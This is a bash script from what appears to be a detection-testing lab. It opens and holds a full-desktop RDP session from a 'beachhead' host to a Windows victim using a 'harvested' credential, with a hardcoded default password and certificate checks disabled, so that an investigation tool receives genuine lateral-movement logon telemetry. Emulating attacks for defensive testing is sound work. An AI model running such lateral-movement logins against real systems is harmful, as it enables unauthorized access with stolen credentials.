#!/bin/bash
# /attacks/win-rdp.sh — open a REAL RDP session from the beachhead to the
# Windows victim (victim-win) with a harvested credential.
#
# Runs ON victim-a. Unlike decoy-touch.sh (which only sends an mstshash token to
# an emulator), this completes a genuine RDP authentication + RemoteInteractive
# logon against a true Windows Server 2022 host. That produces real Windows
# telemetry for TRUDI to investigate over the Velociraptor Windows client:
#   - Security 4624 logon type 10 (RemoteInteractive), source = victim-a
#   - TerminalServices-LocalSessionManager / RemoteConnectionManager 21/22/25
#   - a live ESTABLISHED RDP session the investigation can bind
# The logon itself is the signal for WINRDP-DEMO. No follow-on command runs here
# (WINDECOY-DEMO uses win-decoy.sh to drive a standard-user desktop; running
# a command in the session over FreeRDP is not — RemoteApp/RAIL is unstable and
# the RDP alternate shell is ignored without the RDS role).
#
# Headless: FreeRDP needs a display, so the session runs under Xvfb. A FULL
# DESKTOP session is opened (not RemoteApp) because only a real interactive
# session yields a type-10 logon, and it is HELD open (so netstat/pslist on the
# Windows side show it ESTABLISHED and the investigation can bind it) until
# --cleanup.
set -uo pipefail

TARGET="${WIN_TARGET:-10.73.0.60}"
RDP_USER="${WIN_RDP_USER:-rdpadmin}"
RDP_PASS="${WIN_RDP_PASS:-Sup3rS3cret!}"
PIDFILE="/tmp/.trudi_win_rdp.pid"

rdp_hold() {
    # One held full-desktop session. /cert:ignore accepts the VM's self-signed
    # RDP cert; /sec:nla uses CredSSP so the logon is a clean type-10. xfreerdp
    # stays connected (the virtual desktop under Xvfb) until killed. Returns pid.
    xvfb-run -a xfreerdp \
        /v:"${TARGET}" /u:"${RDP_USER}" /p:"${RDP_PASS}" \
        /cert:ignore /sec:nla /w:1024 /h:768 +clipboard \
        </dev/null >/dev/null 2>&1 &
    echo $!
}

if [[ "${1:-}" == "--cleanup" ]]; then
    if [[ -f "${PIDFILE}" ]]; then
        pid="$(cat "${PIDFILE}" 2>/dev/null || true)"
        [[ -n "${pid}" ]] && kill "${pid}" 2>/dev/null
        rm -f "${PIDFILE}"
    fi
    # xvfb-run launches xfreerdp as a child that OUTLIVES the wrapper pid, so
    # killing the recorded (wrapper) pid alone leaves the session connected.
    # Kill the xfreerdp client talking to this target too.
    pkill -f "xfreerdp .*${TARGET}" 2>/dev/null || true
    echo "[win-rdp] closed held RDP session to ${TARGET}"
    exit 0
fi

echo "[win-rdp] RDP ${RDP_USER}@${TARGET} — opening and holding a full-desktop session (type-10 logon)"
held="$(rdp_hold)"
# A full-desktop logon + profile load can take a few seconds on first logon; give
# it a moment before deciding it did not hold.
sleep 6
if kill -0 "${held}" 2>/dev/null; then
    echo "${held}" > "${PIDFILE}"
    echo "[win-rdp] session held (local pid ${held}; cleanup: /attacks/run win-rdp --cleanup)"
else
    echo "[win-rdp] session did not hold — check victim-win is up and RDP is enabled" >&2
    exit 1
fi
